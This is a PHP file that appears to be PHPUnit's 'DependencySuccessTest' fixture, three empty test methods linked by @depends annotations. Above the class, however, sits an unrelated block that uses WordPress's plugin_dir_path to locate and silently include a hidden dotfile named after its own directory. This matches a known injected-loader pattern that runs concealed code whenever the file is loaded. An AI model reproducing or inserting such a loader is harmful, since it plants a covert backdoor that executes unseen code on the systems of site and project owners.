<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DependencySuccessTest extends PHPUnit_Framework_TestCase
{
    public function testOne()
    {
    }

    /**
     * @depends testOne
     */
    public function testTwo()
    {
    }

    /**
     * @depends DependencySuccessTest::testTwo
     */
    public function testThree()
    {
    }
}
